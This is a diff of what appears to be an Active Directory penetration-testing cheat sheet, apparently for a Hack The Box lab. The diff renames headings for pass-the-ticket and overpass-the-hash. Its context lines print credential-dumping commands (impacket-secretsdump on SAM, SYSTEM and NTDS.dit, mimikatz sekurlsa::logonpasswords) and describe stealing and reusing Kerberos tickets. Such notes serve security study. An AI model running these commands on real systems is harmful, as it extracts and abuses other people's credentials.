@@ -202,7 +202,7 @@ impacket-secretsdump -sam SAM(local SAM file) -system SYSTEM(local SYSTEM file) 
 impacket-secretdump -ntds NTDS.dit(C:\windows\ntds\) -system SYSTEM local0
 ```
 
-### Pass-the-ticket
+### Overpass-the-Hash
 https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
 ```
 sekurlsa::logonpasswords
@@ -291,7 +291,7 @@ Klist to view kerberos tickets
 #Always remember to sync the kdc time
 impacket-mssqlclient -k dc.sequel.htb
 ```
-### Pass The Hash/Pass The Key
+### Pass-the-ticket
 >In this attack, an attacker intercepts and steals a valid ticket-granting ticket (TGT) or service ticket (TGS) from a compromised user or service account.
 
 >The attacker then "passes" this stolen ticket to authenticate themselves as the compromised user or service without needing to know the account's password.
